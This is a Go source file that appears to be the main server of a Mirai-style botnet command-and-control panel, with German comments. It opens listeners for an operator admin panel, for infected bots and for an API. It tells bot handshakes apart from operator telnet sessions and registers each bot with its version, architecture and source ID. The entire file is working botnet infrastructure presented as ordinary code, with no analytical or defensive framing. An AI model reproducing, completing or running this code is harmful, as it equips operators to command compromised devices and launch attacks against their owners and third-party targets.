package main

import (
	"errors"
	"fmt"
	"net"
	"sync"
	"time"
)

const (
	DatabaseFile    = "database.json"
	AdminListenPort = "1234"
	BotListenPort   = "3778"
)

var clientList *ClientList = NewClientList()
var database *Database = NewDatabase(DatabaseFile)
var globalConcurrent = 1
var globalConcurrentMu sync.RWMutex

func GetGlobalConcurrent() int {
	if database != nil {
		return database.GetGlobalSlots()
	}
	globalConcurrentMu.RLock()
	defer globalConcurrentMu.RUnlock()
	if globalConcurrent < 1 {
		return 1
	}
	return globalConcurrent
}

func SetGlobalConcurrent(value int) int {
	if value < 1 {
		value = 1
	}
	if database != nil {
		return database.SetGlobalSlots(value)
	}
	globalConcurrentMu.Lock()
	globalConcurrent = value
	globalConcurrentMu.Unlock()
	return globalConcurrent
}

func acceptLoop(ln net.Listener) {
	for {
		conn, err := ln.Accept()
		if err != nil {
			return
		}
		go initialHandler(conn)
	}
}

func main() {
	initGeoIP()

	adminLn, err := net.Listen("tcp", "0.0.0.0:"+AdminListenPort)
	if err != nil {
		fmt.Println("admin listen:", err)
		return
	}

	botLn, err := net.Listen("tcp", "0.0.0.0:"+BotListenPort)
	if err != nil {
		fmt.Println("bot listen:", err)
		return
	}

	fmt.Printf("Admin panel: :%s | Bot port: :%s | API: :3779\n", AdminListenPort, BotListenPort)

	go func() {
		if err := startApiServer("0.0.0.0:3779"); err != nil {
			fmt.Println("API server:", err)
		}
	}()

	go acceptLoop(botLn)

	acceptLoop(adminLn)

	fmt.Println("ERROR: run ulimit -n 999999")
}

type prependConn struct {
	net.Conn
	pre []byte
}

func (c *prependConn) Read(b []byte) (int, error) {
	if len(c.pre) > 0 {
		n := copy(b, c.pre)
		c.pre = c.pre[n:]
		return n, nil
	}
	return c.Conn.Read(b)
}

func initialHandler(conn net.Conn) {
	defer conn.Close()

	buf := make([]byte, 32)
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	l, err := conn.Read(buf)
	conn.SetReadDeadline(time.Time{})

	// Keine Daten innerhalb Timeout → Admin (z.B. netcat wartet auf Eingabe)
	if err != nil && l == 0 {
		NewAdmin(conn).Handle()
		return
	}
	if err != nil {
		return
	}

	// Bot handshake: 0x00 0x00 0x00 0x01|0x02
	if l >= 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
		switch buf[3] {
		case 0x01:
			handleBotHandshakeV1(conn)
			return
		case 0x02:
			handleBotHandshakeV2(conn)
			return
		}
	}

	// Admin — gelesene Bytes (z.B. Telnet-IAC) an ReadLine durchreichen
	NewAdmin(&prependConn{Conn: conn, pre: append([]byte(nil), buf[:l]...)}).Handle()
}

func handleBotHandshakeV1(conn net.Conn) {
	idLenBuf := make([]byte, 1)
	if err := readXBytes(conn, idLenBuf); err != nil {
		return
	}

	source := ""
	if idLen := int(idLenBuf[0]); idLen > 0 {
		if idLen > 31 {
			return
		}
		sourceBuf := make([]byte, idLen)
		if err := readXBytes(conn, sourceBuf); err != nil {
			return
		}
		source = string(sourceBuf)
	}

	NewBot(conn, 1, 0, source).Handle()
}

func handleBotHandshakeV2(conn net.Conn) {
	hdr := make([]byte, 3)
	if err := readXBytes(conn, hdr); err != nil {
		return
	}

	ver := hdr[0]
	arch := hdr[1]
	idLen := int(hdr[2])

	source := ""
	if idLen > 0 {
		if idLen > 31 {
			return
		}
		sourceBuf := make([]byte, idLen)
		if err := readXBytes(conn, sourceBuf); err != nil {
			return
		}
		source = string(sourceBuf)
	}

	if ver == 0 {
		ver = 1
	}
	NewBot(conn, ver, arch, source).Handle()
}

func readXBytes(conn net.Conn, buf []byte) error {
	tl := 0

	for tl < len(buf) {
		n, err := conn.Read(buf[tl:])
		if err != nil {
			return err
		}
		if n <= 0 {
			return errors.New("Connection closed unexpectedly")
		}
		tl += n
	}

	return nil
}

func netshift(prefix uint32, netmask uint8) uint32 {
	return uint32(prefix >> (32 - netmask))
}